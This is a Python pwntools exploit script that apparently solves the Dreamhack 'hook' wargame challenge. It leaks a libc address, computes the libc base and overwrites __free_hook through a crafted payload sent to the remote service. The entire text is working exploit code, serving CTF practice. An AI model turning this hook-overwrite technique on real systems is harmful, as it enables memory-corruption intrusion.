from pwn import *

#p = process("./hook")
p = remote("host3.dreamhack.games", 15952)
e = ELF("./hook")

libc = ELF("./libc.so.6")

puts_offset = libc.symbols['puts']
stdout_offset = libc.symbols['_IO_2_1_stdout_']
free_hook_offset = libc.symbols['__free_hook']

p.recvuntil(b"stdout: ")
stdout_addr = int(p.recvline()[:-1], 16)
print(hex(stdout_addr))

libc_base = stdout_addr - stdout_offset
free_hook_addr = libc_base + free_hook_offset
puts_offset = libc_base + puts_offset

payload = b"100"
p.sendlineafter(b"Size: ", payload)

payload = p64(free_hook_addr)
payload += p64(puts_offset)

p.sendlineafter(b"Data: ", payload)

p.interactive()
